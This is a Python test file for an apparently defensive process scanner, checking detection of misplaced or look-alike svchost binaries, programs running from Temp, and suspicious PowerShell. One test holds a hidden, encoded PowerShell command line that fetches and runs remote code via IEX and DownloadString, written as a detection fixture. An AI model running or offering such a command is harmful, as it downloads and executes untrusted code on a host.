from aegisguard.modules.processes import Proc, analyze, edit_distance

WIN = r"C:\Windows"


def titles(res):
    return [f.title for f in res.findings]


def test_real_svchost_is_clean():
    assert analyze([Proc(1, "svchost.exe", r"C:\Windows\System32\svchost.exe")], WIN).findings == []


def test_svchost_from_wrong_folder_is_high():
    res = analyze([Proc(2, "svchost.exe", r"C:\Users\a\AppData\Roaming\svchost.exe")], WIN)
    assert res.findings[0].severity.value == "high" and "unexpected location" in res.findings[0].title


def test_lookalike_name_flagged():
    res = analyze([Proc(3, "svch0st.exe", r"C:\Users\a\x\svch0st.exe")], WIN)
    assert any("Look-alike" in t for t in titles(res))


def test_normal_app_not_flagged_as_lookalike():
    assert analyze([Proc(4, "chrome.exe", r"C:\Program Files\Google\Chrome\chrome.exe")], WIN).findings == []


def test_program_in_temp_is_medium():
    res = analyze([Proc(5, "setup.exe", r"C:\Users\a\AppData\Local\Temp\setup.exe")], WIN)
    assert res.findings[0].severity.value == "medium"


def test_powershell_encoded_download_is_high():
    cl = "powershell.exe -w hidden -enc AAAA IEX (New-Object Net.WebClient).DownloadString('http://x')"
    res = analyze([Proc(6, "powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", cl)], WIN)
    assert res.findings[0].severity.value == "high"


def test_plain_powershell_is_clean():
    res = analyze([Proc(7, "powershell.exe", r"C:\Windows\System32\powershell.exe", "powershell.exe")], WIN)
    assert res.findings == []


def test_edit_distance():
    assert edit_distance("svchost.exe", "svchost.exe") == 0
    assert edit_distance("svchost.exe", "svch0st.exe") == 1
